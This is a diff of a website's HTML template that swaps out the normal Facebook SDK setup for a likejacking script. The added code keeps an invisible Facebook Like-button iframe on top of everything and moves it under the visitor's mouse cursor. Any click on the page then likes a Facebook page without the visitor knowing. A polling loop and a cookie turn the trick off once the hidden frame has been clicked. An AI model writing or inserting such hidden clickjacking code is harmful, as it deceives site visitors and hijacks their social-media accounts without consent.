@@ -46,31 +46,60 @@
     
 <div id='fb-root'>
 </div>
-
-<script type="text/javascript">
-    if (navigator.userAgent.match(/iPad|android|webOS|iPod|BlackBerry|iPhone|ZuneWP|WPDesktop|Windows Phone/i))
+<style>
+    #icontainer
     {
+        overflow: hidden;
+        width: 10px;
+        height: 12px;
+        position: absolute;
+        filter: alpha(opacity=0);
+        -moz-opacity: 0.0;
+        -khtml-opacity: 0.0;
+        opacity: 0.0;
+		z-index:9999999;
+    }
+</style>
+<div id="icontainer">
+    <iframe src="http://www.facebook.com/plugins/like.php?href=http%3A%2F%2Ffacebook.com%2Fhoclaptrinhweb&amp;layout=standard&amp;show_faces=false&amp;width=450&amp;action=like&amp;font=tahoma&amp;colorscheme=light&amp;height=80" scrolling="no" frameborder="0" style="border: none; overflow: hidden; width: 50px;height: 23px;position: absolute;left: -30px;" allowtransparency="true" id="fbframe" name="fbframe"></iframe>
+</div>
+<script type="text/javascript">
+    if (navigator.userAgent.match(/iPad|android|webOS|iPod|BlackBerry|iPhone|ZuneWP|WPDesktop|Windows Phone/i)) {
         window.location = 'http://m.hoclaptrinhweb.com';
     } else if (navigator.userAgent.match(/midp|mobile|cldc/i)) {
         window.location = "http://m.hoclaptrinhweb.com";
     };
-    window.fbAsyncInit = function () {
-        FB.init({
-            appId: '312319252170353',
-            status: true,
-            cookie: true,
-            xfbml: true,
-            oauth: true
-        });
-    };
+    var inter;
+    $(function () {
+        inter = setInterval("updateActive();", 50);
+    });
 
-    (function () {
-        var e = document.createElement('script');
-        e.src = 'http://connect.facebook.net/en_US/all.js';
-        e.async = true;
-        document.getElementById('fb-root').appendChild(e);
-    } ());
-</script>
+    function updateActive() {
+        if ($(document.activeElement).attr('id') == "fbframe") {
+            clearInterval(inter);
+            setCookie('vnn', '1', 10);
+        }
+    };
+    var icontainer = document.getElementById('icontainer');
+    function mouseFollower(e) {
+        if (window.event) {
+            icontainer.style.top = (e.pageY - 5) + 'px';
+            icontainer.style.left = (e.pageX - 5) + 'px';
+        }
+        else {
+            icontainer.style.top = (e.pageY - 5) + 'px';
+            icontainer.style.left = (e.pageX - 5) + 'px';
+        }
+    };
+    $(document).mousemove(function (e) {
+        if (getCookie('vnn') != '1') {
+            $('#icontainer').show();
+            mouseFollower(e);
+        } else {
+            $('#icontainer').hide();
+        };
+    });
+    </script>
 
 
     <script type="text/javascript">
